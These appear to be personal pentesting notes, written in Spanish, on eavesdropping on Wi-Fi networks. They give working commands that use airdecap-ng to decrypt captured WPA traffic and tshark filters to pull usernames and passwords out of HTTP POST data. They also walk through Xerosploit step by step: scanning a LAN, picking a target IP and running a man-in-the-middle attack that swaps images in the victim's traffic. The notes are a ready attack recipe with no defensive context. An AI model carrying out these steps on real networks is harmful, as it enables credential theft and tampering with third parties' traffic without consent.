# Técnica de espionaje en la red Wifi 

Tags: #Airdecap #WPA/WPA2 #Xerosploit 

##  Airdecap 

```bash 
❯ aidecap-ng -e <AP> -p 12345676 Captura.cap 
	# e = Nombre del AP
	# p = Password
# Esta herramineta te desencypta paquetes WPA y te genera un archivo con la 'Captura-dec.cap' 

❯ tshark -r Captura-dec.cap -Y "http" 2>/dev/null                                  # Filtramos el trafico http
	# Y = Agregar un filtro (http, dns)
❯ tshark -r Captura-dec.cap -Y "http.request.method==POST" 2>/dev/null             # Filtramos la data por POST
❯ tshark -r Captura-dec.cap -Y "http.request.method==POST" -Tjson 2>/dev/null      # Filtramos la data y lo miramos en Json
❯ tshark -r Captura-dec.cap -Y "http.request.method==POST" -Tfields -e http.file_data 2>/dev/null    # Filtramos por data que contenga un usuario y una passwd 
```

## Xerosploit 

* [Xerosploit](https://github.com/LionSec/xerosploit)
* [Hos to use Xerosploit](https://sospedia.net/man-in-the-middle-con-xerosploit/#:~:text=La%20herramienta%20Xerosploit%20es%20un,de%20nuestro%20equipo%20al%20router.)

```bash 
1. Una vez instalada podemos ejecutarla de la siguiente manera:

❯ python3 xerosploit.py     # Ejecutamos la herramienta 
	❯ scan                 # Ejecutamos un escaneo de la red para identificar los distintos activos 
	❯ 192.168.1.11         # colocamos la IP target 
	❯ help                 # Observamos el panel de ayuda de los diferentes modulos 
	❯ replace              # Este modulo reemplaza todas las imagenes con tu propia imagen 
	❯ run                  # Ejecutamos el comando o modulo anterior 
	❯ /home/kali/Desktop/image.png      # Ruta absoluta de la imagen a colocar 
```